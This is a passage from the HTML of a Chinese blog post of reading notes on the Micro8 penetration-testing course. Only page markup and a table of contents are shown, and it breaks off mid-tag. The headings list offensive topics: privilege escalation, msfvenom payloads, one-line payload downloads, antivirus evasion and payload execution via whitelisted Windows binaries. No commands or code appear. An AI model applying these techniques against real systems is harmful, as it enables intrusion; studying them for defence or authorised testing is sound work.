<!DOCTYPE html>
<html lang="zh-CN">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.3.0">


  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">



<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">

<script class="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","images":"/images","scheme":"Gemini","version":"8.2.0","exturl":false,"sidebar":{"position":"right","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"搜索...","empty":"没有找到任何搜索结果：${query}","hits_time":"找到 ${hits} 个搜索结果（用时 ${time} 毫秒）","hits":"找到 ${hits} 个搜索结果"},"path":"/search.xml","localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":true,"preload":true}};
  </script>
<meta name="description" content="专注 APT 攻击与防御 - Micro8 读书笔记一、基础知识1. Window提权 快速查找EXP">
<meta property="og:type" content="article">
<meta property="og:title" content="专注 APT 攻击与防御">
<meta property="og:url" content="http://example.com/2021/01/12/%E4%B8%93%E6%B3%A8%20APT%20%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%20-%20Micro8%20%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/index.html">
<meta property="og:site_name" content="隐秘行动">
<meta property="og:description" content="专注 APT 攻击与防御 - Micro8 读书笔记一、基础知识1. Window提权 快速查找EXP">
<meta property="og:locale" content="zh_CN">
<meta property="article:published_time" content="2021-01-12T03:56:11.000Z">
<meta property="article:modified_time" content="2021-01-13T01:01:21.877Z">
<meta property="article:author" content="nicaishui">
<meta property="article:tag" content="APT">
<meta name="twitter:card" content="summary">


<link rel="canonical" href="http://example.com/2021/01/12/%E4%B8%93%E6%B3%A8%20APT%20%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1%20-%20Micro8%20%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0/">


<script class="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : false,
    isPost : true,
    lang   : 'zh-CN'
  };
</script>
<title>专注 APT 攻击与防御 | 隐秘行动</title>
  




  <noscript>
  <style>
  body { margin-top: 2rem; }

  .use-motion .menu-item,
  .use-motion .sidebar,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header {
    visibility: visible;
  }

  .use-motion .header,
  .use-motion .site-brand-container .toggle,
  .use-motion .footer { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle,
  .use-motion .custom-logo-image {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line {
    transform: scaleX(1);
  }

  .search-pop-overlay, .sidebar-nav { display: none; }
  .sidebar-panel { display: block; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
  <div class="headband"></div>

  <main class="main">
    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="切换导航栏" role="button">
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
        <span class="toggle-line"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <i class="logo-line"></i>
      <h1 class="site-title">隐秘行动</h1>
      <i class="logo-line"></i>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
        <i class="fa fa-search fa-fw fa-lg"></i>
    </div>
  </div>
</div>



<nav class="site-nav">
  <ul class="main-menu menu">
        <li class="menu-item menu-item-主页"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>主页</a></li>
        <li class="menu-item menu-item-关于"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>关于</a></li>
        <li class="menu-item menu-item-标签"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>标签</a></li>
        <li class="menu-item menu-item-分类"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>分类</a></li>
        <li class="menu-item menu-item-归档"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>归档</a></li>
      <li class="menu-item menu-item-search">
        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
        </a>
      </li>
  </ul>
</nav>



  <div class="search-pop-overlay">
    <div class="popup search-popup"><div class="search-header">
  <span class="search-icon">
    <i class="fa fa-search"></i>
  </span>
  <div class="search-input-container">
    <input autocomplete="off" autocapitalize="off" maxlength="80"
           placeholder="搜索..." spellcheck="false"
           type="search" class="search-input">
  </div>
  <span class="popup-btn-close" role="button">
    <i class="fa fa-times-circle"></i>
  </span>
</div>
<div class="search-result-container no-result">
  <div class="search-result-icon">
    <i class="fa fa-spinner fa-pulse fa-5x"></i>
  </div>
</div>

    </div>
  </div>

</div>
        
  
  <div class="toggle sidebar-toggle" role="button">
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
    <span class="toggle-line"></span>
  </div>

  <aside class="sidebar">

    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
      <ul class="sidebar-nav">
        <li class="sidebar-nav-toc">
          文章目录
        </li>
        <li class="sidebar-nav-overview">
          站点概览
        </li>
      </ul>

      <div class="sidebar-panel-container">
        <!--noindex-->
        <div class="post-toc-wrap sidebar-panel">
            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%93%E6%B3%A8-APT-%E6%94%BB%E5%87%BB%E4%B8%8E%E9%98%B2%E5%BE%A1-Micro8-%E8%AF%BB%E4%B9%A6%E7%AC%94%E8%AE%B0"><span class="nav-number">1.</span> <span class="nav-text">专注 APT 攻击与防御 - Micro8 读书笔记</span></a></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%80%E3%80%81%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86"><span class="nav-number">2.</span> <span class="nav-text">一、基础知识</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#1-Window%E6%8F%90%E6%9D%83-%E5%BF%AB%E9%80%9F%E6%9F%A5%E6%89%BEEXP"><span class="nav-number">2.1.</span> <span class="nav-text">1. Window提权 快速查找EXP</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#2-Linux%E6%8F%90%E6%9D%83-%E4%BE%9D%E8%B5%96EXP%E7%AF%87"><span class="nav-number">2.2.</span> <span class="nav-text">2. Linux提权 依赖EXP篇</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#6-%E5%8F%8D%E6%94%BB%E7%9A%84%E4%B8%80%E6%AC%A1%E6%BA%AF%E6%BA%90-%E2%80%94-%E9%A1%B9%E7%9B%AE%E5%AE%9E%E6%88%983"><span class="nav-number">2.3.</span> <span class="nav-text">6. 反攻的一次溯源 — 项目实战3</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#7-SqlServer-%E5%B8%B8%E7%94%A8%E6%93%8D%E4%BD%9C%E8%BF%9C%E7%A8%8B%E6%A1%8C%E9%9D%A2%E8%AF%AD%E5%8F%A5"><span class="nav-number">2.4.</span> <span class="nav-text">7. SqlServer 常用操作远程桌面语句</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%8C%E3%80%81%E5%AE%9E%E6%88%98"><span class="nav-number">3.</span> <span class="nav-text">二、实战</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#8-%E6%A8%A1%E6%8B%9F%E8%AF%89%E6%B1%82%E4%BB%BB%E5%8A%A1%E6%94%BB%E5%87%BB"><span class="nav-number">3.1.</span> <span class="nav-text">8. 模拟诉求任务攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#16-%E7%BA%A2%E8%93%9D%E5%AF%B9%E6%8A%97%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%951"><span class="nav-number">3.2.</span> <span class="nav-text">16. 红蓝对抗渗透测试1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#51-%E9%A1%B9%E7%9B%AE%E5%9B%9E%E5%BF%86%EF%BC%9A%E4%BD%93%E7%B3%BB%E7%9A%84%E6%9C%AC%E8%B4%A8%E6%98%AF%E7%9F%A5%E8%AF%86%E7%82%B9%E4%B8%B2%E8%81%94"><span class="nav-number">3.3.</span> <span class="nav-text">51. 项目回忆：体系的本质是知识点串联</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#69-%E6%B8%97%E9%80%8F%EF%BC%8C%E6%8C%81%E7%BB%AD%E6%B8%97%E9%80%8F%EF%BC%8C%E5%90%8E%E6%B8%97%E9%80%8F%E7%9A%84%E6%9C%AC%E8%B4%A8"><span class="nav-number">3.4.</span> <span class="nav-text">69. 渗透，持续渗透，后渗透的本质</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#92-%EF%BC%9A%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84Payload%E5%BA%94%E7%94%A8"><span class="nav-number">3.5.</span> <span class="nav-text">92. ：实战中的Payload应用</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#94-%E5%9F%BA%E4%BA%8E%E5%AE%9E%E6%88%98%E4%B8%AD%E7%9A%84small-payload"><span class="nav-number">3.6.</span> <span class="nav-text">94. 基于实战中的small payload</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81-%E5%B7%A5%E5%85%B7%E8%AE%B2%E8%A7%A3"><span class="nav-number">4.</span> <span class="nav-text">三、 工具讲解</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#9-%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D-the-backdoor-factory"><span class="nav-number">4.1.</span> <span class="nav-text">9. 工具介绍 the-backdoor-factory</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#10-msfvenom%E5%B8%B8%E7%94%A8%E7%94%9F%E6%88%90payload%E5%91%BD%E4%BB%A4"><span class="nav-number">4.2.</span> <span class="nav-text">10. msfvenom常用生成payload命令</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#14-%E5%9F%BA%E4%BA%8E%E7%AC%AC%E5%8D%81%E8%AF%BE%E8%A1%A5%E5%85%85-Payload-1"><span class="nav-number">4.3.</span> <span class="nav-text">14. 基于第十课补充 Payload 1</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#15-%E5%9F%BA%E4%BA%8E%E7%AC%AC%E5%8D%81%E8%AF%BE%E8%A1%A5%E5%85%85payload2"><span class="nav-number">4.4.</span> <span class="nav-text">15. 基于第十课补充payload2</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#11-%E5%B7%A5%E5%85%B7%E4%BB%8B%E7%BB%8D-Veil-Evasion"><span class="nav-number">4.5.</span> <span class="nav-text">11. 工具介绍 Veil-Evasion</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%B8%89%E3%80%81-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F"><span class="nav-number">5.</span> <span class="nav-text">三、 内网渗透</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#12-%E5%9F%BA%E4%BA%8E-UDP-%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="nav-number">5.1.</span> <span class="nav-text">12. 基于 UDP 发现内网存活主机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#13-%E5%9F%BA%E4%BA%8E-ARP-%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="nav-number">5.2.</span> <span class="nav-text">13. 基于 ARP 发现内网存活主机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#19-%E5%9F%BA%E4%BA%8Enetbios%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="nav-number">5.3.</span> <span class="nav-text">19. 基于netbios发现内网存活主机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#20-%E5%9F%BA%E4%BA%8Esnmp%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="nav-number">5.4.</span> <span class="nav-text">20. 基于snmp发现内网存活主机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#21-%E5%9F%BA%E4%BA%8EICMP%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="nav-number">5.5.</span> <span class="nav-text">21. 基于ICMP发现内网存活主机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#22-%E5%9F%BA%E4%BA%8ESMB%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="nav-number">5.6.</span> <span class="nav-text">22. 基于SMB发现内网存活主机</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#29-%E5%8F%91%E7%8E%B0%E7%9B%AE%E6%A0%87WEB%E7%A8%8B%E5%BA%8F%E6%95%8F%E6%84%9F%E7%9B%AE%E5%BD%95%E7%AC%AC%E4%B8%80%E5%AD%A3"><span class="nav-number">5.7.</span> <span class="nav-text">29. 发现目标WEB程序敏感目录第一季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#50-%E5%9F%BA%E4%BA%8ESqlDataSourceEnumerator%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA"><span class="nav-number">5.8.</span> <span class="nav-text">50. 基于SqlDataSourceEnumerator发现内网存活主机</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%9B%9B%E3%80%81-MSF"><span class="nav-number">6.</span> <span class="nav-text">四、 MSF</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#32-%E9%85%8D%E7%BD%AEvps%E4%B8%8A%E7%9A%84msf"><span class="nav-number">6.1.</span> <span class="nav-text">32. 配置vps上的msf</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#23-%E5%9F%BA%E4%BA%8EMSF%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E7%AC%AC%E4%B8%80%E5%AD%A3"><span class="nav-number">6.2.</span> <span class="nav-text">23. 基于MSF发现内网存活主机第一季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#24-%E5%9F%BA%E4%BA%8EMSF%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E7%AC%AC%E4%BA%8C%E5%AD%A3"><span class="nav-number">6.3.</span> <span class="nav-text">24. 基于MSF发现内网存活主机第二季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#25-%E5%9F%BA%E4%BA%8EMSF%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E7%AC%AC%E4%B8%89%E5%AD%A3"><span class="nav-number">6.4.</span> <span class="nav-text">25. 基于MSF发现内网存活主机第三季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#26-%E5%9F%BA%E4%BA%8EMSF%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E7%AC%AC%E5%9B%9B%E5%AD%A3"><span class="nav-number">6.5.</span> <span class="nav-text">26. 基于MSF发现内网存活主机第四季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#27-%E5%9F%BA%E4%BA%8EMSF%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E7%AC%AC%E4%BA%94%E5%AD%A3"><span class="nav-number">6.6.</span> <span class="nav-text">27. 基于MSF发现内网存活主机第五季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#28-%E5%9F%BA%E4%BA%8EMSF%E5%8F%91%E7%8E%B0%E5%86%85%E7%BD%91%E5%AD%98%E6%B4%BB%E4%B8%BB%E6%9C%BA%E7%AC%AC%E5%85%AD%E5%AD%A3"><span class="nav-number">6.7.</span> <span class="nav-text">28. 基于MSF发现内网存活主机第六季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#33-%E6%94%BB%E5%87%BBMysql%E6%9C%8D%E5%8A%A1"><span class="nav-number">6.8.</span> <span class="nav-text">33. 攻击Mysql服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#34-%E6%94%BB%E5%87%BBSql-server-%E6%9C%8D%E5%8A%A1"><span class="nav-number">6.9.</span> <span class="nav-text">34. 攻击Sql server 服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#35-%E4%B8%8ESqlmap%E7%BB%93%E5%90%88%E6%94%BB%E5%87%BB"><span class="nav-number">6.10.</span> <span class="nav-text">35. 与Sqlmap结合攻击</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#42-%E6%94%BB%E5%87%BBFTP%E6%9C%8D%E5%8A%A1"><span class="nav-number">6.11.</span> <span class="nav-text">42. 攻击FTP服务</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#67-meterpreter%E4%B8%8B%E7%9A%84irb%E6%93%8D%E4%BD%9C%E7%AC%AC%E4%B8%80%E5%AD%A3"><span class="nav-number">6.12.</span> <span class="nav-text">67. meterpreter下的irb操作第一季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#97-MSF%E9%85%8D%E7%BD%AE%E8%87%AA%E5%AE%9A%E4%B9%89Payload%E6%8E%A7%E5%88%B6%E7%9B%AE%E6%A0%87%E4%B8%BB%E6%9C%BA%E6%9D%83%E9%99%90"><span class="nav-number">6.13.</span> <span class="nav-text">97. MSF配置自定义Payload控制目标主机权限</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E4%BA%94%E3%80%81-%E4%B8%8B%E8%BD%BDPayload"><span class="nav-number">7.</span> <span class="nav-text">五、 下载Payload</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#37-vbs%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload"><span class="nav-number">7.1.</span> <span class="nav-text">37. vbs一句话下载payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#38-certutil%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload"><span class="nav-number">7.2.</span> <span class="nav-text">38. certutil一句话下载payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#39-vbs%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%E8%A1%A5%E5%85%85"><span class="nav-number">7.3.</span> <span class="nav-text">39. vbs一句话下载payload补充</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#40-ftp%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload"><span class="nav-number">7.4.</span> <span class="nav-text">40. ftp一句话下载payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#70-ftp%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%E8%A1%A5%E5%85%85"><span class="nav-number">7.5.</span> <span class="nav-text">70. ftp一句话下载payload补充</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#41-bitsadmin%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload"><span class="nav-number">7.6.</span> <span class="nav-text">41. bitsadmin一句话下载payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#43-js%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload"><span class="nav-number">7.7.</span> <span class="nav-text">43. js一句话下载payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#44-certutil%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%E8%A1%A5%E5%85%85"><span class="nav-number">7.8.</span> <span class="nav-text">44. certutil一句话下载payload补充</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#45-%E8%A7%A3%E5%86%B3bat%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload%E9%BB%91%E7%AA%97"><span class="nav-number">7.9.</span> <span class="nav-text">45. 解决bat一句话下载payload黑窗</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#46-powershell%E4%B8%80%E5%8F%A5%E8%AF%9D%E4%B8%8B%E8%BD%BDpayload"><span class="nav-number">7.10.</span> <span class="nav-text">46. powershell一句话下载payload</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#53-%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F%E4%B8%AD%E7%9A%84%E6%96%87%E4%BB%B6%E4%BC%A0%E8%BE%93"><span class="nav-number">7.11.</span> <span class="nav-text">53. 内网渗透中的文件传输</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%85%AD%E3%80%81%E5%85%8D%E6%9D%80"><span class="nav-number">8.</span> <span class="nav-text">六、免杀</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#47-payload%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF"><span class="nav-number">8.1.</span> <span class="nav-text">47. payload分离免杀思路</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#48-payload%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80%E6%80%9D%E8%B7%AF%E7%AC%AC%E4%BA%8C%E5%AD%A3"><span class="nav-number">8.2.</span> <span class="nav-text">48. payload分离免杀思路第二季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#49-%E5%85%B3%E4%BA%8EPowershell%E5%AF%B9%E6%8A%97%E5%AE%89%E5%85%A8%E8%BD%AF%E4%BB%B6"><span class="nav-number">8.3.</span> <span class="nav-text">49. 关于Powershell对抗安全软件</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#66-%E5%80%9F%E5%8A%A9aspx%E5%AF%B9payload%E8%BF%9B%E8%A1%8C%E5%88%86%E7%A6%BB%E5%85%8D%E6%9D%80"><span class="nav-number">8.4.</span> <span class="nav-text">66. 借助aspx对payload进行分离免杀</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#68-%E5%9F%BA%E4%BA%8ERuby%E5%86%85%E5%AD%98%E5%8A%A0%E8%BD%BDshellcode%E7%AC%AC%E4%B8%80%E5%AD%A3"><span class="nav-number">8.5.</span> <span class="nav-text">68. 基于Ruby内存加载shellcode第一季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#71-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msbuild-exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%B8%80%E5%AD%A3"><span class="nav-number">8.6.</span> <span class="nav-text">71. 基于白名单Msbuild.exe执行payload第一季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#72-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Installutil-exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%BA%8C%E5%AD%A3"><span class="nav-number">8.7.</span> <span class="nav-text">72. 基于白名单Installutil.exe执行payload第二季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#73-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regasm-exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%B8%89%E5%AD%A3"><span class="nav-number">8.8.</span> <span class="nav-text">73. 基于白名单Regasm.exe执行payload第三季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#74-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvcs-exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%9B%9B%E5%AD%A3"><span class="nav-number">8.9.</span> <span class="nav-text">74. 基于白名单Regsvcs.exe执行payload第四季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#75-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta-exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%BA%94%E5%AD%A3"><span class="nav-number">8.10.</span> <span class="nav-text">75. 基于白名单Mshta.exe执行payload第五季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#76-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Compiler-exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%85%AD%E5%AD%A3"><span class="nav-number">8.11.</span> <span class="nav-text">76.  基于白名单Compiler.exe执行payload第六季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#77-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Csc-exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%B8%83%E5%AD%A3"><span class="nav-number">8.12.</span> <span class="nav-text">77. 基于白名单Csc.exe执行payload第七季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#78-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%85%AB%E5%AD%A3"><span class="nav-number">8.13.</span> <span class="nav-text">78. 基于白名单Msiexec执行payload第八季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#79-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Regsvr32%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%B9%9D%E5%AD%A3"><span class="nav-number">8.14.</span> <span class="nav-text">79. 基于白名单Regsvr32执行payload第九季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#80-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Wmic%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%AD%A3"><span class="nav-number">8.15.</span> <span class="nav-text">80. 基于白名单Wmic执行payload第十季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#81-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Rundll32-exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E4%B8%80%E5%AD%A3"><span class="nav-number">8.16.</span> <span class="nav-text">81. 基于白名单Rundll32.exe执行payload第十一季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#82-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Odbcconf%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E4%BA%8C%E5%AD%A3"><span class="nav-number">8.17.</span> <span class="nav-text">82. 基于白名单Odbcconf执行payload第十二季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#83-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95PsExec%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E4%B8%89%E5%AD%A3"><span class="nav-number">8.18.</span> <span class="nav-text">83. 基于白名单PsExec执行payload第十三季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#84-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Forfiles%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E5%9B%9B%E5%AD%A3"><span class="nav-number">8.19.</span> <span class="nav-text">84. 基于白名单Forfiles执行payload第十四季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#85-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Pcalua%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%8D%81%E4%BA%94%E5%AD%A3"><span class="nav-number">8.20.</span> <span class="nav-text">85. 基于白名单Pcalua执行payload第十五季</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#86-%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Msiexec%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E5%85%AB%E5%AD%A3%E8%A1%A5%E5%85%85"><span class="nav-number">8.21.</span> <span class="nav-text">86. 基于白名单Msiexec执行payload第八季补充</span></a></li><li class="nav-item nav-level-2"><a 